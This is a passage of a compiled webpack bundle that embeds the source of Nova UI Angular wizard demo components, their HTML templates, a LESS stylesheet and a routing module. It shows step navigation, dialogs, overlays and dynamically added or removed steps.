this.validateStep(formControlName);\n\n        if (!this.form.valid) {\n            return;\n        }\n\n        step.completed = true;\n        this.toastService.success({\n            title: $localize`Success`,\n            message: $localize`Wizard was completed successfully`,\n            options: {\n                timeOut: 2000,\n            },\n        });\n        this.activeDialog.close();\n    }\n\n    public resetStep(step: WizardStepV2Component): void {\n        step.reset();\n    }\n\n    private validateStep(formGroup: string): void {\n        this.form.get(formGroup)?.markAllAsTouched();\n    }\n\n    private handleDynamicSteps(\n        title: string,\n        template: TemplateRef<string>,\n        controlValue: boolean\n    ) {\n        const newStep: IWizardStepData = {\n            title: title,\n            templateRef: template,\n        };\n        const index = this.dynamicSteps.findIndex((step) =>\n            isEqual(step, newStep)\n        );\n\n        controlValue\n            ? this.dynamicSteps.push({ ...newStep })\n            : this.dynamicSteps.splice(index, 1);\n    }\n}\n'},7169:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-wizard-horizontal #wizard (selectionChange)="onSelectionChange($event)">\n    <nui-wizard-step-v2\n        *ngFor="let step of steps; let i = index; let isLast = last"\n    >\n        <ng-template nuiWizardStepLabel>{{ step.title }}</ng-template>\n        <ng-container *ngTemplateOutlet="step.templateRef"></ng-container>\n        <ng-template nuiWizardStepFooter>\n            <ng-container *ngIf="!isLast || i >= 1">\n                <button\n                    type="button"\n                    displayStyle="action"\n                    nui-button\n                    (click)="resetWizard()"\n                    i18n\n                >\n                    Cancel\n                </button>\n            </ng-container>\n            <ng-container *ngIf="i !== 0">\n                <button\n                    type="button"\n                    nuiWizardPrevious\n                    nui-button\n                    icon="caret-left"\n                >\n                    Back\n                </button>\n            </ng-container>\n            <ng-container *ngIf="!isLast">\n                <button\n                    nuiWizardNext\n                    type="button"\n                    nui-button\n                    displayStyle="primary"\n                    icon="caret-right"\n                    iconRight="true"\n                >\n                    Next\n                </button>\n            </ng-container>\n            <ng-container *ngIf="isLast && i >= 1">\n                <button\n                    type="button"\n                    displayStyle="primary"\n                    nui-button\n                    (click)="finishWizard()"\n                    i18n\n                >\n                    Finish\n                </button>\n            </ng-container>\n        </ng-template>\n    </nui-wizard-step-v2>\n\n    <ng-template #dynamicStep>\n        <p i18n>\n            Hi! I\'m a step added dynamically using a TemplateRef by clicking a\n            button from the first step !\n        </p>\n    </ng-template>\n\n    <ng-template #normalStep>\n        <div class="p-5">\n            <p i18n>Hi! You can add next step dynamically</p>\n\n            <button nui-button type="button" (click)="addStep(dynamicStep)">\n                Add dynamic step\n            </button>\n        </div>\n    </ng-template>\n</nui-wizard-horizontal>\n'},35437:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { StepperSelectionEvent } from "@angular/cdk/stepper";\nimport {\n    AfterViewInit,\n    Component,\n    TemplateRef,\n    ViewChild,\n} from "@angular/core";\n\nimport { ToastService, WizardHorizontalComponent } from "@nova-ui/bits";\n\ninterface IWizardStepData {\n    title: string;\n    templateRef: TemplateRef<string>;\n}\n\n@Component({\n    selector: "nui-wizard-step-change-example",\n    templateUrl: "./wizard-step-change.example.component.html",\n})\nexport class WizardStepChangeExampleComponent implements AfterViewInit {\n    public steps: IWizardStepData[] = [];\n\n    @ViewChild("normalStep") normalStep: TemplateRef<string>;\n    @ViewChild("wizard") wizard: WizardHorizontalComponent;\n\n    constructor(private toastService: ToastService) {}\n\n    public ngAfterViewInit(): void {\n        this.addStep(this.normalStep, $localize`Normal step`);\n    }\n\n    public addStep(templateRef: TemplateRef<string>, title?: string): void {\n        this.steps.push({\n            title: title ?? `Dynamic Step`,\n            templateRef: templateRef,\n        });\n    }\n\n    public onSelectionChange($event: StepperSelectionEvent): void {\n        this.toastService.info({\n            title: $localize`Selected step changed.`,\n            message: $localize`You moved from step with index ${$event.previouslySelectedIndex} to step with index ${$event.selectedIndex}`,\n            options: {\n                timeOut: 5000,\n                extendedTimeOut: 2000,\n            },\n        });\n    }\n\n    public resetWizard(): void {\n        this.wizard.reset();\n    }\n\n    public finishWizard(): void {\n        this.toastService.success({\n            title: $localize`Success`,\n            message: $localize`Wizard was completed successfully`,\n            options: {\n                timeOut: 2000,\n            },\n        });\n    }\n}\n'},5041:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='\x3c!--Horizontal Wizard--\x3e\n<div class="mb-3">\n    <nui-wizard-horizontal id="nui-wizard-v2-horizontal">\n        \x3c!--Step 1--\x3e\n        <nui-wizard-step-v2 label="Step1">\n            Step 1\n\n            <ng-template nuiWizardStepFooter>\n                <ng-container *ngTemplateOutlet="wizardNext"></ng-container>\n            </ng-template>\n        </nui-wizard-step-v2>\n\n        \x3c!--Step 2--\x3e\n        <nui-wizard-step-v2 label="Step2">\n            Step 2\n\n            <ng-template nuiWizardStepFooter>\n                <ng-container *ngTemplateOutlet="wizardPrevious"></ng-container>\n                <ng-container *ngTemplateOutlet="wizardNext"></ng-container>\n            </ng-template>\n        </nui-wizard-step-v2>\n\n        \x3c!--Step 3--\x3e\n        <nui-wizard-step-v2 label="Step3">\n            Step 3\n            <ng-template nuiWizardStepFooter>\n                <ng-container *ngTemplateOutlet="wizardPrevious"></ng-container>\n                <ng-container *ngTemplateOutlet="wizardNext"></ng-container>\n            </ng-template>\n        </nui-wizard-step-v2>\n\n        <ng-template #wizardPrevious>\n            <button\n                type="button"\n                class="previous"\n                nuiWizardPrevious\n                nui-button\n                icon="caret-left"\n            >\n                Back\n            </button>\n        </ng-template>\n\n        <ng-template #wizardNext>\n            <button\n                nuiWizardNext\n                class="next"\n                type="button"\n                nui-button\n                displayStyle="primary"\n                icon="caret-right"\n                iconRight="true"\n            >\n                Next\n            </button>\n        </ng-template>\n    </nui-wizard-horizontal>\n</div>\n\n\x3c!--Dialog Wizard--\x3e\n<div class="mb-3">\n    <ng-template #dialogWizard>\n        <div nuiResizeObserver #dialog>\n            <div nui-busy [busy]="busy" id="nui-busy">\n                <div class="busy-content">\n                    <nui-dialog-header\n                        i18n-title\n                        title="Wizard dialog"\n                        (closed)="closeDialog()"\n                    ></nui-dialog-header>\n                    <div class="dialog-body compact-mode">\n                        <nui-wizard-horizontal\n                            #wizard\n                            id="nui-wizard-v2-horizontal-dialog"\n                            [state]="state"\n                            (finished)="saveState($event)"\n                        >\n                            \x3c!--  This defines the first step of the wizard --\x3e\n                            <nui-wizard-step-v2 label="Completed">\n                                \x3c!-- the current step content --\x3e\n                                <div class="step-content-wrapper">\n                                    <span i18n\n                                        >This is the first step of our\n                                        horizontal wizard</span\n                                    >.\n                                </div>\n                                \x3c!-- content of the footer --\x3e\n                                <ng-template nuiWizardStepFooter>\n                                    <button\n                                        id="nui-wizard-busy-btn"\n                                        type="button"\n                                        nui-button\n                                        (click)="toggleBusy()"\n                                    >\n                                        Toggle busy\n                                    </button>\n                                    <ng-container\n                                        *ngTemplateOutlet="wizardCancelDialog"\n                                    ></ng-container>\n                                    <ng-container\n                                        *ngTemplateOutlet="wizardNextDialog"\n                                    ></ng-container>\n                                </ng-template>\n                            </nui-wizard-step-v2>\n\n                            <nui-wizard-step-v2 label="Active">\n                                <div class="step-content-wrapper">\n                                    <span i18n\n                                        >This is the second step of our\n                                        horizontal wizard</span\n                                    >.\n                                </div>\n                                <ng-template nuiWizardStepFooter>\n                                    <ng-container\n                                        *ngTemplateOutlet="wizardCancelDialog"\n                                    ></ng-container>\n                                    <ng-container\n                                        *ngTemplateOutlet="wizardPreviousDialog"\n                                    ></ng-container>\n                                    <ng-container\n                                        *ngTemplateOutlet="wizardNextDialog"\n                                    ></ng-container>\n                                </ng-template>\n                            </nui-wizard-step-v2>\n\n                            <nui-wizard-step-v2 label="Not Visited">\n                                <div class="step-content-wrapper">\n                                    <span i18n\n                                        >This is the third step of our\n                                        horizontal wizard</span\n                                    >\n                                </div>\n\n                                <ng-template nuiWizardStepFooter>\n                                    <ng-container\n                                        *ngTemplateOutlet="wizardCancelDialog"\n                                    ></ng-container>\n                                    <ng-container\n                                        *ngTemplateOutlet="wizardPreviousDialog"\n                                    ></ng-container>\n                                    <ng-container\n                                        *ngTemplateOutlet="wizardNextDialog"\n                                    ></ng-container>\n                                </ng-template>\n                            </nui-wizard-step-v2>\n\n                            <nui-wizard-step-v2 label="Summary" #finalStep>\n                                <div class="step-content-wrapper">\n                                    <span i18n\n                                        >We finally reached our last step</span\n                                    >\n                                </div>\n                                <ng-template nuiWizardStepFooter>\n                                    <ng-container\n                                        *ngTemplateOutlet="wizardCancelDialog"\n                                    ></ng-container>\n                                    <ng-container\n                                        *ngTemplateOutlet="wizardPreviousDialog"\n                                    ></ng-container>\n                                    <button\n                                        class="complete"\n                                        type="button"\n                                        nui-button\n                                        displayStyle="primary"\n                                        (click)="completeWizard(finalStep)"\n                                    >\n                                        Finish\n                                    </button>\n                                </ng-template>\n                            </nui-wizard-step-v2>\n\n                            <ng-template #wizardCancelDialog>\n                                <button\n                                    class="cancel"\n                                    type="button"\n                                    displayStyle="action"\n                                    nui-button\n                                    (click)="\n                                        openConfirmationOverlay(overlay, wizard)\n                                    "\n                                >\n                                    Cancel\n                                </button>\n                            </ng-template>\n\n                            <ng-template #wizardPreviousDialog>\n                                <button\n                                    type="button"\n                                    nuiWizardPrevious\n                                    nui-button\n                                    icon="caret-left"\n                                >\n                                    Back\n                                </button>\n                            </ng-template>\n\n                            <ng-template #wizardNextDialog>\n                                <button\n                                    nuiWizardNext\n                                    class="next"\n                                    type="button"\n                                    nui-button\n                                    displayStyle="primary"\n                                    icon="caret-right"\n                                    iconRight="true"\n                                >\n                                    Next\n                                </button>\n                            </ng-template>\n                        </nui-wizard-horizontal>\n                    </div>\n                </div>\n                <nui-spinner\n                    size="large"\n                    i18n-message\n                    message="Data is loading from remote server..."\n                ></nui-spinner>\n            </div>\n        </div>\n        <nui-overlay #overlay [toggleReference]="dialog">\n            <div class="overlay-class">\n                <div class="overlay-content">\n                    <div class="header">Really want to leave?</div>\n                    <div class="body">\n                        <p i18n>\n                            There is at least one accomplished step within this\n                            wizard. Are you sure you want to leave?\n                        </p>\n                    </div>\n                    <div class="footer">\n                        <button\n                            nui-button\n                            displayStyle="action"\n                            type="button"\n                            (click)="overlay.hide()"\n                        >\n                            Cancel\n                        </button>\n                        <button\n                            nui-button\n                            type="button"\n                            (click)="overlay.hide(); closeDialog()"\n                        >\n                            Leave\n                        </button>\n                    </div>\n                </div>\n            </div>\n        </nui-overlay>\n    </ng-template>\n\n    <button\n        id="nui-wizard-dialog-trigger"\n        nui-button\n        type="button"\n        (click)="openDialog(dialogWizard)"\n        i18n\n    >\n        Open dialog wizard\n    </button>\n</div>\n\n<div class="mb-3">\n    <nui-wizard-horizontal #wizardDynamic id="nui-wizard-horizontal-dynamic">\n        <nui-wizard-step-v2\n            *ngFor="let step of steps; let i = index; let isLast = last"\n        >\n            <ng-template nuiWizardStepLabel>{{\n                step.title + " (" + i + ")"\n            }}</ng-template>\n            <ng-container *ngTemplateOutlet="step.templateRef"></ng-container>\n            <ng-template nuiWizardStepFooter>\n                <ng-container *ngIf="i !== 0">\n                    <button\n                        icon="caret-left"\n                        nui-button\n                        nuiWizardPrevious\n                        type="button"\n                    >\n                        Back\n                    </button>\n                </ng-container>\n                <ng-container *ngIf="!isLast">\n                    <button\n                        displayStyle="primary"\n                        icon="caret-right"\n                        iconRight="true"\n                        nui-button\n                        nuiWizardNext\n                        type="button"\n                    >\n                        Next\n                    </button>\n                </ng-container>\n            </ng-template>\n        </nui-wizard-step-v2>\n\n        <ng-template #dynamicStep>\n            <p class="m-5" i18n>\n                Hi! I\'m a step added dynamically using a TemplateRef by clicking\n                a button from the first step !\n            </p>\n        </ng-template>\n\n        <ng-template #normalStep>\n            <div class="p-5">\n                <p i18n>Hi! You can add next step dynamically</p>\n\n                <button\n                    (click)="addStep(dynamicStep)"\n                    class="add"\n                    nui-button\n                    type="button"\n                    id="nui-add-step-dynamically"\n                >\n                    Add dynamic step w/template\n                </button>\n            </div>\n        </ng-template>\n    </nui-wizard-horizontal>\n    <div class="d-flex">\n        <div>\n            <span\n                [ngStyle]="{ \'font-weight\': \'bold\' }"\n                class="nui-textbox--bold"\n                >Step index to remove</span\n            >\n            <br />\n            <nui-textbox-number\n                #number\n                [minValue]="1"\n                [value]="1"\n            ></nui-textbox-number>\n        </div>\n        <button\n            (click)="removeStep(+number.value)"\n            [disabled]="+number.value < 1"\n            class="ml-3 h-25 align-self-end"\n            displayStyle="destructive"\n            i18n\n            id="nui-remove-wizard-step-button"\n            nui-button\n            type="button"\n        >\n            Remove step dynamically\n        </button>\n    </div>\n</div>\n\n<div class="mb-3">\n    <nui-wizard-horizontal #nuiWizard id="nui-wizard-v2-responsive-headers">\n        <ng-container *ngFor="let step of responsiveSteps; let i = index">\n            <nui-wizard-step-v2 i18n-label [label]="\'Step \' + (i + 1)">\n                <div class="m-5">\n                    <span i18n>This is the step #{{ i + 1 }}</span\n                    >.\n                </div>\n                <ng-template nuiWizardStepFooter>\n                    <ng-container\n                        *ngTemplateOutlet="wizardCancelResponsive"\n                    ></ng-container>\n                    <ng-container *ngIf="i">\n                        <ng-container\n                            *ngTemplateOutlet="wizardPreviousResponsive"\n                        ></ng-container>\n                    </ng-container>\n                    <ng-container *ngIf="i !== responsiveSteps.length - 1">\n                        <ng-container\n                            *ngTemplateOutlet="wizardNextResponsive"\n                        ></ng-container>\n                    </ng-container>\n                    <ng-container *ngIf="i === responsiveSteps.length - 1">\n                        <ng-container\n                            *ngTemplateOutlet="wizardFinishResponsive"\n                        ></ng-container>\n                    </ng-container>\n                </ng-template>\n            </nui-wizard-step-v2>\n        </ng-container>\n\n        <ng-template #wizardPreviousResponsive>\n            <button\n                type="button"\n                nuiWizardPrevious\n                nui-button\n                icon="caret-left"\n            >\n                Back\n            </button>\n        </ng-template>\n\n        <ng-template #wizardNextResponsive>\n            <button\n                nuiWizardNext\n                type="button"\n                nui-button\n                displayStyle="primary"\n                icon="caret-right"\n                iconRight="true"\n            >\n                Next\n            </button>\n        </ng-template>\n\n        <ng-template #wizardCancelResponsive>\n            <button type="button" nui-button displayStyle="action">\n                Cancel\n            </button>\n        </ng-template>\n\n        <ng-template #wizardFinishResponsive>\n            <button type="button" nui-button displayStyle="primary">\n                Finish\n            </button>\n        </ng-template>\n    </nui-wizard-horizontal>\n</div>\n'},2877:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport {\n    FlexibleConnectedPositionStrategy,\n    OverlayRef,\n} from "@angular/cdk/overlay";\nimport {\n    AfterViewInit,\n    Component,\n    Inject,\n    OnDestroy,\n    TemplateRef,\n    ViewChild,\n} from "@angular/core";\nimport { Subject } from "rxjs";\nimport { takeUntil } from "rxjs/operators";\n\nimport {\n    DialogService,\n    IWizardState,\n    NuiDialogRef,\n    OverlayComponent,\n    WizardHorizontalComponent,\n    WizardStepV2Component,\n} from "@nova-ui/bits";\n\ninterface IWizardStepData {\n    title: string;\n    templateRef: TemplateRef<string>;\n}\n\n@Component({\n    selector: "nui-wizard-test",\n    templateUrl: "./wizard-test.component.html",\n    styleUrls: ["./wizard-test.less"],\n})\nexport class WizardV2TestComponent implements AfterViewInit, OnDestroy {\n    public onDestroy$ = new Subject<void>();\n    public overlayTriggered$ = new Subject<void>();\n    public responsiveSteps: Array<any> = Array.from({ length: 20 });\n\n    private overlayRef: OverlayRef;\n    public busy: boolean = false;\n    public activeDialog: NuiDialogRef;\n\n    constructor(@Inject(DialogService) private dialogService: DialogService) {}\n\n    public vegetables = [\n        $localize`Cabbage`,\n        $localize`Potato`,\n        $localize`Tomato`,\n        $localize`Carrot`,\n    ];\n    public selectedVegetables = [$localize`Potato`, $localize`Tomato`];\n    public state: IWizardState;\n    public steps: IWizardStepData[] = [];\n\n    @ViewChild("normalStep") normalStep: TemplateRef<string>;\n\n    public ngAfterViewInit(): void {\n        this.addStep(this.normalStep);\n    }\n\n    public isChecked(vegetable: string): boolean {\n        return this.selectedVegetables.indexOf(vegetable) > -1;\n    }\n\n    public valuesChanged(values: any[]): void {\n        this.selectedVegetables = [...values];\n    }\n\n    public openDialog(content: TemplateRef<string>): void {\n        this.activeDialog = this.dialogService.open(content, {\n            size: "lg",\n            windowClass: "active-dialog",\n        });\n    }\n\n    public closeDialog(): void {\n        this.activeDialog.close();\n    }\n\n    public toggleBusy(): void {\n        this.busy = !this.busy;\n        setTimeout(() => {\n            this.busy = false;\n        }, 3000);\n    }\n\n    public openConfirmationOverlay(\n        overlay: OverlayComponent,\n        wizard: WizardHorizontalComponent\n    ): void {\n        if (wizard.selectedIndex === 0) {\n            this.closeDialog();\n            return;\n        }\n\n        this.overlayTriggered$.next();\n        overlay.toggle();\n\n        this.overlayRef = overlay.getOverlayRef();\n        (\n            this.overlayRef.getConfig()\n                .positionStrategy as FlexibleConnectedPositionStrategy\n        ).withPositions([\n            {\n                originX: "start",\n                originY: "top",\n                overlayX: "start",\n                overlayY: "top",\n            },\n        ]);\n        this.updateOverlayDimensions(overlay);\n        this.activeDialog?.closed$\n            .pipe(takeUntil(this.overlayTriggered$), takeUntil(this.onDestroy$))\n            .subscribe(() => overlay.hide());\n    }\n\n    public open(content: TemplateRef<string>): void {\n        this.activeDialog = this.dialogService.open(content, {\n            size: "lg",\n            backdrop: "static",\n            useOverlay: true,\n        });\n    }\n\n    public actionDone(): void {\n        this.activeDialog.close();\n    }\n\n    public onContainerResize(overlay: OverlayComponent): void {\n        this.updateOverlayDimensions(overlay);\n    }\n\n    public ngOnDestroy(): void {\n        this.onDestroy$.next();\n        this.onDestroy$.complete();\n        this.overlayTriggered$.complete();\n    }\n\n    public saveState(state: IWizardState): void {\n        this.state = state;\n    }\n\n    public completeWizard(step: WizardStepV2Component): void {\n        step.completed = true;\n        this.activeDialog.close();\n    }\n\n    public addStep(templateRef: TemplateRef<string>, title?: string): void {\n        this.steps.push({\n            title: title ?? `Dynamic Step ${this.steps.length + 1}`,\n            templateRef: templateRef,\n        });\n    }\n\n    public removeStep(index = 1): void {\n        this.steps.splice(index, 1);\n    }\n\n    private updateOverlayDimensions(overlay: OverlayComponent): void {\n        this.overlayRef?.updateSize({\n            width: overlay.toggleReference.getBoundingClientRect().width,\n            height: overlay.toggleReference.getBoundingClientRect().height,\n        });\n    }\n}\n'},1740:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='@import (reference) "nui-framework-colors";\n@import (reference) "nui-framework-spaces";\n@import (reference) "nui-framework-typography";\n\n.step-content-wrapper {\n    padding: @nui-space-md;\n}\n\n.overlay {\n    &-class {\n        display: flex;\n        height: 100%;\n        .setCssVariable(background-color, nui-color-overlay-busy);\n    }\n\n    &-content {\n        display: flex;\n        flex-direction: column;\n        justify-content: center;\n        max-width: 460px;\n        margin: auto;\n        padding: (@nui-space-md * 2);\n        .setCssVariable(background-color, nui-color-bg-content);\n\n        .header {\n            display: flex;\n            justify-content: center;\n            margin-bottom: @nui-space-md;\n            .nui-text-widget();\n        }\n\n        .body {\n            display: flex;\n            text-align: center;\n            .nui-text-size(default);\n        }\n\n        .footer {\n            display: flex;\n            flex-direction: row;\n            justify-content: center;\n\n            button[displayStyle="action"] {\n                margin-right: @nui-space-md;\n            }\n        }\n    }\n}\n'},77769:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-wizard-horizontal #wizardComponent>\n    \x3c!--  content of the 1st step --\x3e\n    <nui-wizard-step-v2\n        i18n-label\n        label="Very long header text. Very long header text"\n    >\n        \x3c!-- content of the current step --\x3e\n        <div class="p-5">\n            <span i18n>Step with long header text</span>\n        </div>\n\n        \x3c!-- content of the footer --\x3e\n        <ng-template nuiWizardStepFooter>\n            <ng-container *ngTemplateOutlet="wizardCancel"></ng-container>\n            <ng-container *ngTemplateOutlet="wizardNext"></ng-container>\n        </ng-template>\n    </nui-wizard-step-v2>\n\n    \x3c!--  step without tooltip --\x3e\n    <nui-wizard-step-v2>\n        <ng-template nuiWizardStepLabel>\n            <span>Without tooltip</span>\n        </ng-template>\n        <div class="p-5">\n            <span i18n>Step without header tooltip</span>\n        </div>\n        \x3c!-- content of the footer --\x3e\n        <ng-template nuiWizardStepFooter>\n            <ng-container *ngTemplateOutlet="wizardCancel"></ng-container>\n            <ng-container *ngTemplateOutlet="wizardPrevious"></ng-container>\n            <ng-container *ngTemplateOutlet="wizardNext"></ng-container>\n        </ng-template>\n    </nui-wizard-step-v2>\n\n    \x3c!--  Step with custom label template and tooltip--\x3e\n    <nui-wizard-step-v2>\n        <ng-template nuiWizardStepLabel>\n            <span i18n-nuiTooltip nuiTooltip="Custom Label template">\n                <i>Custom Label template</i>\n            </span>\n        </ng-template>\n        <div class="p-5">\n            <span i18n>Step with custom label in header</span>\n        </div>\n        \x3c!-- Notice how both label and footer can be placed anywhere in the content of wizard step --\x3e\n        <ng-template nuiWizardStepFooter>\n            <ng-container *ngTemplateOutlet="wizardCancel"></ng-container>\n            <ng-container *ngTemplateOutlet="wizardPrevious"></ng-container>\n            <button\n                type="button"\n                displayStyle="primary"\n                nui-button\n                (click)="finishWizard()"\n                i18n\n            >\n                Finish\n            </button>\n        </ng-template>\n    </nui-wizard-step-v2>\n\n    <ng-template #wizardCancel>\n        <button\n            type="button"\n            displayStyle="action"\n            nui-button\n            (click)="resetWizard()"\n            i18n\n        >\n            Cancel\n        </button>\n    </ng-template>\n\n    <ng-template #wizardPrevious>\n        <button\n            i18n\n            type="button"\n            nuiWizardPrevious\n            nui-button\n            icon="caret-left"\n        >\n            Back\n        </button>\n    </ng-template>\n\n    <ng-template #wizardNext>\n        <button\n            nuiWizardNext\n            i18n\n            type="button"\n            nui-button\n            displayStyle="primary"\n            icon="caret-right"\n            iconRight="true"\n        >\n            Next\n        </button>\n    </ng-template>\n</nui-wizard-horizontal>\n'},51173:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component, ViewChild } from "@angular/core";\n\nimport { ToastService, WizardHorizontalComponent } from "@nova-ui/bits";\n\n@Component({\n    selector: "nui-wizard-tooltip-example",\n    templateUrl: "./wizard-tooltip.example.component.html",\n})\nexport class WizardTooltipExampleComponent {\n    @ViewChild("wizardComponent") wizard: WizardHorizontalComponent;\n\n    constructor(private toastService: ToastService) {}\n\n    public resetWizard(): void {\n        this.wizard.reset();\n    }\n\n    public finishWizard(): void {\n        this.toastService.success({\n            title: $localize`Success`,\n            message: $localize`Wizard was completed successfully`,\n            options: {\n                timeOut: 2000,\n            },\n        });\n    }\n}\n'},39555:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { NgModule } from "@angular/core";\nimport { FormsModule, ReactiveFormsModule } from "@angular/forms";\nimport { RouterModule } from "@angular/router";\n\nimport {\n    NuiBusyModule,\n    NuiButtonModule,\n    NuiCheckboxModule,\n    NuiDatePickerModule,\n    NuiDialogModule,\n    NuiDocsModule,\n    NuiFormFieldModule,\n    NuiIconModule,\n    NuiMessageModule,\n    NuiProgressModule,\n    NuiRadioModule,\n    NuiSpinnerModule,\n    NuiTextboxModule,\n    NuiValidationMessageModule,\n    NuiWizardV2Module,\n    SrlcStage,\n    NuiSelectV2Module,\n    NuiOverlayModule,\n    NuiTooltipModule,\n    DEMO_PATH_TOKEN,\n} from "@nova-ui/bits";\n\nimport {\n    WizardBusyExampleComponent,\n    WizardCustomComponent,\n    WizardCustomExampleComponent,\n    WizardCustomFooterExampleComponent,\n    WizardDialogExampleComponent,\n    WizardDocsComponent,\n    WizardDynamicExampleComponent,\n    WizardHorizontalExampleComponent,\n    WizardRemoveStepExampleComponent,\n    WizardVerticalExampleComponent,\n    WizardAsyncFormValidationExampleComponent,\n    WizardWithCustomIconsExampleComponent,\n    WizardRestoreStateExampleComponent,\n    WizardStepChangeExampleComponent,\n    WizardResponsiveHeaderExampleComponent,\n    WizardWithConfirmationDialogOnCancelExampleComponent,\n    WizardTooltipExampleComponent,\n    WizardV2TestComponent,\n} from "./index";\nimport { getDemoFiles } from "../../../static/demo-files-factory";\n\nconst routes = [\n    {\n        path: "",\n        component: WizardDocsComponent,\n        data: {\n            srlc: {\n                stage: SrlcStage.beta,\n            },\n            showThemeSwitcher: true,\n        },\n    },\n    {\n        path: "confirm-on-cancel",\n        component: WizardWithConfirmationDialogOnCancelExampleComponent,\n        data: {\n            showThemeSwitcher: true,\n            srlc: {\n                hideIndicator: true,\n            },\n        },\n    },\n    {\n        path: "test",\n        component: WizardV2TestComponent,\n        data: {\n            srlc: {\n                hideIndicator: true,\n            },\n            showThemeSwitcher: false,\n        },\n    },\n];\n\n@NgModule({\n    imports: [\n        NuiButtonModule,\n        NuiMessageModule,\n        NuiDocsModule,\n        NuiTextboxModule,\n        NuiRadioModule,\n        NuiCheckboxModule,\n        NuiDialogModule,\n        NuiValidationMessageModule,\n        NuiFormFieldModule,\n        FormsModule,\n        ReactiveFormsModule,\n        RouterModule.forChild(routes),\n        NuiWizardV2Module,\n        NuiSpinnerModule,\n        NuiBusyModule,\n        NuiProgressModule,\n        NuiDatePickerModule,\n        NuiIconModule,\n        NuiSelectV2Module,\n        NuiOverlayModule,\n        NuiTooltipModule,\n    ],\n    declarations: [\n        WizardDocsComponent,\n        WizardHorizontalExampleComponent,\n        WizardVerticalExampleComponent,\n   